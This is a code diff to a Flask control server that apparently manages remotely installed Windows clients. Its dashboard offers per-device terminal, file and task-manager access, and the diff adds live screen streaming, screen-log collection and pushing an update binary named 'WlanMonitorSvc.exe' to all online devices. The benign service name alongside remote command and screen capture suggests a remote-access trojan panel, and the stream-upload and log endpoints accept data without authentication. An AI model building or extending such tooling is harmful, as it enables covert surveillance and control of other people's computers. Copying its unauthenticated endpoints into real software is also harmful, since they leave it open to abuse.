@@ -48,8 +48,19 @@ else:
     clients_db = {}
 
 def save_db():
-    with open(DB_FILE, 'w', encoding='utf-8') as f:
-        json.dump(clients_db, f, ensure_ascii=False)
+    try:
+        db_copy = {}
+        for mac, info in list(clients_db.items()):
+            safe_info = {}
+            for k, v in list(info.items()):
+                if k not in ['stream_frame']:
+                    if isinstance(v, (str, int, float, bool, type(None), list, dict)):
+                        safe_info[k] = v
+            db_copy[mac] = safe_info
+        with open(DB_FILE, 'w', encoding='utf-8') as f:
+            json.dump(db_copy, f, ensure_ascii=False)
+    except Exception as e:
+        print(f"Save DB Error: {e}")
 
 def is_online(last_seen_str):
     try:
@@ -767,10 +778,18 @@ def update_mgmt():
     uploaded_file = request.files.get('file')
 
     if new_ver:
+        new_ver_str = new_ver.strip()
+        if uploaded_file and uploaded_file.filename != '':
+            binary_content = uploaded_file.read()
+            # 校验版本号是否被正确编译到二进制文件中
+            if new_ver_str.encode('ascii', errors='ignore') not in binary_content:
+                return f"<h2 style='color:red;'>错误：版本校验失败！</h2><p>您输入的版本号 {new_ver_str} 没有包含在上传的 EXE 文件内部。</p><p>请确保您已在 Visual Studio 的代码里修改了 MANUAL_COMPILE_VERSION 并成功重新生成了程序！</p><button onclick='history.back()'>返回重试</button>", 400
+
+            with open(os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'), 'wb') as f:
+                f.write(binary_content)
+
         with open(VERSION_FILE, 'w', encoding='utf-8') as f:
-            f.write(new_ver.strip())
-    if uploaded_file and uploaded_file.filename != '':
-        uploaded_file.save(os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'))
+            f.write(new_ver_str)
 
     # 下发全局紧急更新通知给所有在线设备
     for mac, info in clients_db.items():
@@ -1282,6 +1301,7 @@ def tables_partial():
                     <a href="/terminal/{{ mac }}" style="background:#007bff; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">>_ 终端</a>
                     <a href="/files/{{ mac }}" style="background:#17a2b8; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📁 文件</a>
                     <a href="/taskmgr/{{ mac }}" style="background:#6f42c1; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📊 任务管理</a>
+                    <a href="/screen/{{ mac }}" style="background:#fd7e14; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📺 屏幕画面</a>
                 </td>
                 <td class="status-online">📡 在线</td>
             </tr>
@@ -1514,6 +1534,215 @@ def index():
     </html>
     """
     return render_template_string(html_template, current_server_version=current_server_version)
+
+@app.route('/screen/<mac>')
+def screen_page(mac):
+    if not session.get('logged_in'): return redirect(url_for('login'))
+    if mac not in clients_db: return "设备不存在"
+
+    SCREEN_HTML = """
+    <!DOCTYPE html>
+    <html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8">
+        <title>屏幕监控 - {{ info.name }} ({{ mac }})</title>
+        <style>
+            body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; padding: 20px; margin: 0; text-align: center; }
+            .header { border-bottom: 2px solid #ddd; padding-bottom: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; text-align: left; }
+            .header a { color: #007bff; text-decoration: none; }
+            .btn { background: #007bff; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 16px; margin: 10px; }
+            .btn:hover { background: #0056b3; }
+            .btn:disabled { background: #ccc; cursor: not-allowed; }
+            .btn-danger { background: #dc3545; }
+            .btn-danger:hover { background: #c82333; }
+            img { max-width: 100%; max-height: 85vh; border: 1px solid #ccc; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin-top: 10px; background: #000; }
+        </style>
+    </head>
+    <body onunload="stopStream()">
+        <div class="header">
+            <span>📺 屏幕监控 - {{ info.name }} [{{ mac }}] (支持30FPS流畅串流)</span>
+            <a href="/">[ 返回设备列表 ]</a>
+        </div>
+        <div>
+            <button id="startBtn" class="btn" onclick="startStream()">▶️ 开始流畅串流</button>
+            <button id="stopBtn" class="btn btn-danger" onclick="stopStream()" disabled>⏹️ 停止串流</button>
+            <br>
+            <span id="statusText" style="color: #666; font-size: 14px;">点击“开始流畅串流”获取连续自适应视频流...</span>
+            <span id="fpsText" style="color: #d00; font-weight: bold; margin-left: 15px; font-size: 16px;"></span>
+        </div>
+        <img id="streamImg" src="" alt="等待串流..." style="display: none;">
+
+        <script>
+            let fpsInterval = null;
+
+            function startStream() {
+                var btnStart = document.getElementById('startBtn');
+                var btnStop = document.getElementById('stopBtn');
+                var st = document.getElementById('statusText');
+
+                btnStart.disabled = true;
+                btnStop.disabled = false;
+                st.innerText = "⏳ 正在通知受控端拉起流媒体进进程... 请稍候...";
+
+                fetch('/api/stream/start/{{ mac }}', { method: 'POST' })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'ok') {
+                        st.innerText = "✅ 信令已下发，正在接收端缓冲...";
+                        var img = document.getElementById('streamImg');
+                        img.style.display = 'inline-block';
+                        setTimeout(() => {
+                            img.src = '/stream_video/{{ mac }}?t=' + Date.now();
+                            st.innerText = "📺 串流进行中";
+                            fpsInterval = setInterval(pollFps, 1000);
+                        }, 1000);
+                    } else {
+                        st.innerText = "❌ 信令发送失败!";
+                        btnStart.disabled = false;
+                        btnStop.disabled = true;
+                    }
+                }).catch(e => {
+                    st.innerText = "❌ 网络错误: " + e;
+                    btnStart.disabled = false;
+                    btnStop.disabled = true;
+                });
+            }
+
+            function stopStream() {
+                document.getElementById('startBtn').disabled = false;
+                document.getElementById('stopBtn').disabled = true;
+                document.getElementById('statusText').innerText = "⏹️ 串流已停止";
+                document.getElementById('streamImg').style.display = 'none';
+                document.getElementById('streamImg').src = "";
+                document.getElementById('fpsText').innerText = "";
+                if(fpsInterval) clearInterval(fpsInterval);
+
+                fetch('/api/stream/stop/{{ mac }}', { method: 'POST', keepalive: true });
+            }
+
+            function pollFps() {
+                fetch('/api/stream/fps/{{ mac }}')
+                .then(r => r.json())
+                .then(data => {
+                    document.getElementById('fpsText').innerText = "FPS: " + data.fps;
+                });
+            }
+        </script>
+    </body>
+    </html>
+    """
+    return render_template_string(SCREEN_HTML, mac=mac, info=clients_db[mac])
+
+@app.route('/api/stream/start/<mac>', methods=['POST'])
+def api_stream_start(mac):
+    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
+    if mac in clients_db:
+        clients_db[mac]['stream_active'] = True
+        upload_url = f"{request.host_url.rstrip('/')}/api/stream/upload/{mac}"
+        cmd = f"F_CMD:STREAM:{upload_url}"
+        clients_db[mac]['pending_file_cmd'] = cmd
+        save_db()
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "error"})
+
+@app.route('/api/stream/stop/<mac>', methods=['POST'])
+def api_stream_stop(mac):
+    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
+    if mac in clients_db:
+        clients_db[mac]['stream_active'] = False
+        save_db()
+    return jsonify({"status": "ok"})
+
+@app.route('/api/stream/upload/<mac>', methods=['POST'])
+def stream_upload(mac):
+    try:
+        if mac in clients_db:
+            clients_db[mac]['stream_active'] = True
+            stream = request.environ.get('wsgi.input')
+
+            while clients_db[mac].get('stream_active', False):
+                length_bytes = b""
+                while len(length_bytes) < 4:
+                    b = stream.read(4 - len(length_bytes))
+                    if not b:
+                        break
+                    length_bytes += b
+
+                if len(length_bytes) < 4:
+                    break
+
+                import struct
+                length = struct.unpack('<I', length_bytes)[0]
+                if length == 0 or length > 50000000:
+                    break
+
+                frame_data = b""
+                while len(frame_data) < length:
+                    chunk = stream.read(length - len(frame_data))
+                    if not chunk:
+                        break
+                    frame_data += chunk
+
+                if len(frame_data) < length:
+                    break
+
+                clients_db[mac]['stream_frame'] = frame_data
+
+                now = time.time()
+                if 'stream_fps_start' not in clients_db[mac] or now - clients_db[mac].get('stream_fps_start', now) > 2.0:
+                    clients_db[mac]['stream_fps_start'] = now
+                    clients_db[mac]['stream_frames'] = 0
+
+                clients_db[mac]['stream_frames'] += 1
+                elapsed = now - clients_db[mac]['stream_fps_start']
+                if elapsed >= 1.0:
+                    clients_db[mac]['stream_fps'] = clients_db[mac]['stream_frames'] / elapsed
+                    clients_db[mac]['stream_fps_start'] = now
+                    clients_db[mac]['stream_frames'] = 0
+
+            return "STOP", 200
+    except Exception as e:
+        print("Stream exception:", e)
+    return "OK", 200
+
+@app.route('/api/stream/fps/<mac>')
+def api_stream_fps(mac):
+    if not session.get('logged_in'): return jsonify({"fps": 0})
+    if mac in clients_db:
+        return jsonify({"fps": round(clients_db[mac].get('stream_fps', 0), 1)})
+    return jsonify({"fps": 0})
+
+from flask import Response
+def generate_mjpeg(mac):
+    last_frame = b''
+    while clients_db.get(mac, {}).get('stream_active', False):
+        frame = clients_db.get(mac, {}).get('stream_frame', b'')
+        if frame and frame != last_frame:
+            last_frame = frame
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+        else:
+            time.sleep(0.01)
+
+@app.route('/stream_video/<mac>')
+def stream_video(mac):
+    if not session.get('logged_in'): return "未登录", 403
+    if mac in clients_db:
+        clients_db[mac]['stream_active'] = True
+        save_db()
+        return Response(generate_mjpeg(mac), mimetype='multipart/x-mixed-replace; boundary=frame')
+    return "Error", 404
+
+@app.route('/api/screen/log', methods=['POST'])
+def screen_log_endpoint():
+    mac = request.form.get('mac')
+    log_msg = request.form.get('log')
+    if mac in clients_db and log_msg:
+        import urllib.parse
+        log_msg = urllib.parse.unquote(log_msg)
+        clients_db[mac]['screen_log'] = clients_db[mac].get('screen_log', '') + log_msg + '\n'
+        save_db()
+    return "OK", 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
